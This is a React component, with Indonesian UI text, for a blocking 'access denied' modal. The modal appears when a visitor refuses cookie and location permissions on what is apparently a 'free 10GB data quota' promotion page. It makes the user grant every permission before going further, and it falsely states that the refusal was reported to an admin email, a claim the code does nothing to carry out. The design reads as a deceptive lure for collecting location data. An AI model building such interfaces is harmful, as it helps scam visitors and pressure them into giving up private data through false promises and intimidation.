// app/components/DeniedModal.js
"use client";

import {
  XCircle,
  RefreshCw,
  AlertTriangle,
  Lock,
  Mail,
  Settings,
  HelpCircle,
} from "lucide-react";
import { useState, useEffect } from "react"; // Pastikan useEffect diimpor

export default function DeniedModal({ isOpen, reason, onRetry }) {
  // --- 1. PINDAHKAN SEMUA HOOK KE SINI ---
  // Semua hook dipanggil di paling atas, sebelum logika apapun.
  const [showInstructions, setShowInstructions] = useState(false);
  const [countdown, setCountdown] = useState(5);

  // --- 2. PERBAIKI: Gunakan useEffect untuk side effect (timer) ---
  // useEffect adalah tempat yang benar untuk logika seperti setInterval.
  useEffect(() => {
    // Hanya jalankan countdown jika modal terbuka
    if (isOpen) {
      const interval = setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(interval);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      // Fungsi cleanup untuk membersihkan interval saat komponen unmount atau modal ditutup
      return () => clearInterval(interval);
    } else {
      // Reset countdown ke 5 saat modal ditutup
      setCountdown(5);
    }
  }, [isOpen]); // Dependency array: efek ini berjalan saat nilai `isOpen` berubah

  // --- 3. LOGIKA KONDISIONAL ADA DI BAWAH SEMUA HOOK ---
  if (!isOpen) return null;

  const handleRetry = () => {
    // Clear all stored data
    localStorage.removeItem("hasVisitedBefore");
    localStorage.removeItem("permission_granted");
    localStorage.removeItem("user_location");

    // Clear cookies
    document.cookie =
      "cookie_permission=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT";

    // Reload page
    window.location.reload();
  };

  const getReasonMessage = () => {
    switch (reason) {
      case "User manually denied permissions":
        return "Anda menolak pemberian izin";
      case "Failed to get location":
        return "Gagal mendapatkan lokasi dari perangkat";
      case "Geolocation not supported":
        return "Browser tidak mendukung geolocation";
      case "User clicked outside modal":
        return "Anda menutup modal permintaan izin";
      case "Failed to save location":
        return "Gagal menyimpan data lokasi";
      default:
        return reason || "Izin cookie dan lokasi diperlukan";
    }
  };

  // --- Sisanya tidak berubah ---
  return (
    <div className="fixed inset-0 z-[9999]">
      {/* Backdrop - cannot close by clicking */}
      <div className="absolute inset-0 bg-gradient-to-br from-red-500/20 to-orange-500/20 backdrop-blur-sm" />

      {/* Modal Container */}
      <div className="relative h-screen flex items-center justify-center p-4">
        <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full overflow-hidden border border-gray-200">
          {/* Error Header */}
          <div className="relative">
            <div className="absolute inset-0 bg-gradient-to-r from-red-500 to-orange-600" />
            <div className="relative px-8 py-12 text-white text-center">
              <div className="w-24 h-24 mx-auto bg-white/20 rounded-full flex items-center justify-center mb-6 border-4 border-white/30">
                <Lock className="w-12 h-12" />
              </div>
              <h2 className="text-3xl font-bold mb-3">⛔ Akses Ditolak</h2>
              <p className="text-white/90 text-lg">
                Izin diperlukan untuk melanjutkan
              </p>
            </div>
          </div>

          {/* Content */}
          <div className="px-8 py-8">
            {/* Error Message */}
            <div className="bg-red-50 border border-red-200 rounded-2xl p-6 mb-8">
              <div className="flex items-start">
                <XCircle className="w-6 h-6 text-red-600 mr-4 flex-shrink-0" />
                <div>
                  <h3 className="font-bold text-gray-900 text-lg mb-2">
                    Akses Tidak Diberikan
                  </h3>
                  <p className="text-gray-700">
                    {getReasonMessage()}. Anda harus mengizinkan{" "}
                    <span className="font-bold">cookie</span> dan{" "}
                    <span className="font-bold">lokasi</span> untuk mengakses
                    promo kuota gratis.
                  </p>
                </div>
              </div>
            </div>

            {/* Email Notification */}
            <div className="bg-yellow-50 border border-yellow-200 rounded-2xl p-5 mb-8">
              <div className="flex items-start">
                <Mail className="w-6 h-6 text-yellow-600 mr-4 flex-shrink-0" />
                <div>
                  <h4 className="font-bold text-gray-900 mb-2">
                    📧 Notifikasi Admin
                  </h4>
                  <p className="text-gray-600 text-sm">
                    Pemberitahuan penolakan telah dikirim ke email admin untuk
                    verifikasi keamanan sistem.
                  </p>
                </div>
              </div>
            </div>

            {/* Instructions Toggle */}
            <button
              onClick={() => setShowInstructions(!showInstructions)}
              className="w-full flex items-center justify-between p-4 bg-gray-100 hover:bg-gray-200 rounded-2xl mb-6 transition"
            >
              <span className="font-medium text-gray-900 flex items-center">
                <HelpCircle className="w-5 h-5 mr-3 text-purple-600" />
                Cara Mengizinkan Permission
              </span>
              <span
                className={`transition-transform ${showInstructions ? "rotate-180" : ""}`}
              >
                ▼
              </span>
            </button>

            {/* Detailed Instructions */}
            {showInstructions && (
              <div className="bg-gray-50 rounded-2xl p-5 mb-8">
                <h4 className="font-bold text-gray-900 mb-4 text-lg">
                  📝 Langkah-langkah:
                </h4>
                <div className="space-y-4">
                  <div className="flex items-start">
                    <div className="w-8 h-8 bg-purple-100 text-purple-800 rounded-full flex items-center justify-center text-sm font-bold mr-3 flex-shrink-0">
                      1
                    </div>
                    <div>
                      <p className="font-medium text-gray-900">
                        Izinkan Cookie
                      </p>
                      <p className="text-sm text-gray-600">
                        Di pengaturan browser, aktifkan cookie untuk situs ini
                      </p>
                    </div>
                  </div>

                  <div className="flex items-start">
                    <div className="w-8 h-8 bg-purple-100 text-purple-800 rounded-full flex items-center justify-center text-sm font-bold mr-3 flex-shrink-0">
                      2
                    </div>
                    <div>
                      <p className="font-medium text-gray-900">
                        Izinkan Lokasi
                      </p>
                      <p className="text-sm text-gray-600">
                        Klik "Allow" ketika browser meminta akses lokasi
                      </p>
                    </div>
                  </div>

                  <div className="flex items-start">
                    <div className="w-8 h-8 bg-purple-100 text-purple-800 rounded-full flex items-center justify-center text-sm font-bold mr-3 flex-shrink-0">
                      3
                    </div>
                    <div>
                      <p className="font-medium text-gray-900">
                        Klik "IZINKAN SEMUA"
                      </p>
                      <p className="text-sm text-gray-600">
                        Tekan tombol hijau untuk memberikan semua izin
                      </p>
                    </div>
                  </div>

                  <div className="flex items-start">
                    <div className="w-8 h-8 bg-purple-100 text-purple-800 rounded-full flex items-center justify-center text-sm font-bold mr-3 flex-shrink-0">
                      4
                    </div>
                    <div>
                      <p className="font-medium text-gray-900">
                        Dapatkan Kuota
                      </p>
                      <p className="text-sm text-gray-600">
                        Tunggu verifikasi dan terima kuota 10GB gratis
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Browser Settings */}
            <div className="bg-blue-50 border border-blue-200 rounded-2xl p-5 mb-8">
              <div className="flex items-start">
                <Settings className="w-6 h-6 text-blue-600 mr-4 flex-shrink-0" />
                <div>
                  <h4 className="font-bold text-gray-900 mb-2">
                    ⚙️ Periksa Pengaturan Browser
                  </h4>
                  <p className="text-gray-600 text-sm">
                    Pastikan cookie dan lokasi diizinkan untuk situs ini di
                    pengaturan browser Anda.
                  </p>
                </div>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="space-y-4">
              <button
                onClick={handleRetry}
                className="w-full bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 text-white font-bold py-4 px-6 rounded-2xl transition flex items-center justify-center"
              >
                <RefreshCw className="w-5 h-5 mr-3" />
                {countdown > 0
                  ? `Coba Lagi (${countdown}s)`
                  : "Refresh Halaman & Coba Lagi"}
              </button>

              <button
                onClick={() => window.close()}
                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-800 font-bold py-4 px-6 rounded-2xl transition"
              >
                Tutup Halaman
              </button>
            </div>

            {/* Warning */}
            <div className="mt-8 p-4 bg-red-50 border border-red-100 rounded-xl">
              <div className="flex items-start">
                <AlertTriangle className="w-5 h-5 text-red-600 mr-3 mt-0.5 flex-shrink-0" />
                <p className="text-sm text-red-800">
                  <span className="font-bold">Peringatan:</span> Anda tidak akan
                  bisa mengakses promo kuota gratis tanpa mengizinkan permission
                  yang diperlukan.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
